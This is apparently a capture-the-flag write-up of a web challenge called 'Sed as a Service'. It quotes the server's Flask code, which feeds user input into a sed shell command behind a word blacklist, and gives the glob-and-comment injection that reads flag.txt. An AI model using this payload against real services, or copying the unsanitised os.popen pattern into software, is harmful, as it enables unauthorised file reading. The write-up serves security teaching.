# Sed as a Service (SaaS)

>We have to find the flag which is present in flag.txt

We have the source code of the Sed server.
While inspecting the source code, we find an interesting thing:

```python
blacklist = ["flag", "cat", "|", "&", ";", "`", "$"]
```

Thus, we can see that flag is blacklisted. Also, cat is blacklisted. So we cannot append cat with the sed command.

We also see from app.py,

```python
@app.route('/backend')
def backend():
    for word in blacklist:
        if word in request.args['query']:
            return "Stop hacking.\n"
    return html.escape(os.popen(f"sed {request.args['query']} stuff.txt").read())
```

Thus we observe that our query is passed without any sanitation into a shell command.
While using the web-app, if we use 

```bash
's/a/a/g'
```
we find out that stuff.txt contains a simple Lorem text.

We then try to appendother commands with sed, but it does not work.
Then we try
```bash
's/a/a/g' *.txt #
```
This causes sed to replace all the 'a' with 'a' in all files having a .txt extension. We end it with a # to comment out the rest of the command in the original format string mentioned in app.py
Thus the final command becomes
```bash
sed 's/a/a/g' *.txt # stuff.txt
```
which gives us the contents of flag.txt
We see that flag is printed at the beginning:
```
ictf{:roocu:roocu:roocu:roocu:roocu:roocursion:rsion:rsion:rsion:rsion:rsion:_473fc2d1}
```
